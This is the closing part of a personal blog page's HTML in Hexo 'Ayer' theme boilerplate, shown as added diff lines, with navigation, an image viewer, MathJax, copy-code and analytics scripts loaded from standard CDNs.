+</div>
+
+      </div>
+    </main>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/images/ayer-side.svg" alt="Kiprey&#39;s Blog"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags">标签</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/friends">友链</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/about">关于</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="搜索">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+        <i class="ri-rss-line"></i>
+      </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <script>
+      if (window.matchMedia("(max-width: 768px)").matches) {
+        document.querySelector('.content').classList.remove('on');
+        document.querySelector('.sidebar').classList.remove('on');
+      }
+    </script>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
+  <div class="reward-box">
+    
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+
+
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: '.tocbot',
+    contentSelector: '.article-entry',
+    headingSelector: 'h1, h2, h3, h4, h5, h6',
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: 'main',
+    positionFixedSelector: '.tocbot',
+    positionFixedClass: 'is-position-fixed',
+    fixedSidebarOffset: 'auto'
+  });
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css">
+<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css">
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script>
+
+<!-- MathJax -->
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+      tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+  });
+
+  MathJax.Hub.Queue(function() {
+      var all = MathJax.Hub.getAllJax(), i;
+      for(i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+      }
+  });
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.6/unpacked/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script>
+  var ayerConfig = {
+    mathjax: true
+  }
+</script>
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+<!-- ClickLove -->
+
+<!-- ClickBoom1 -->
+
+<!-- ClickBoom2 -->
+
+
+<script src="/js/clickBoom2.js"></script>
+
+
+<!-- CodeCopy -->
+
+
+<link rel="stylesheet" href="/css/clipboard.css">
+
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+
+
+<!-- CanvasBackground -->
+
+
+<script src="/js/dz.js"></script>
+
+
+<!-- mermaid -->
+
+  <script src='https://cdn.bootcdn.net/ajax/libs/mermaid/8.5.2/mermaid.min.js'></script>
+  <script>
+    if (window.mermaid) {
+      mermaid.initialize({theme: 'forest'});
+    }
+  </script>
+
+<!-- baiduSpider auto push -->
+
+  <script>
+    (function(){
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https'){
+       bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+      }
+      else{
+      bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+      }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+    </script>
+
+
+    
+  </div>
+</body>
+
+</html>
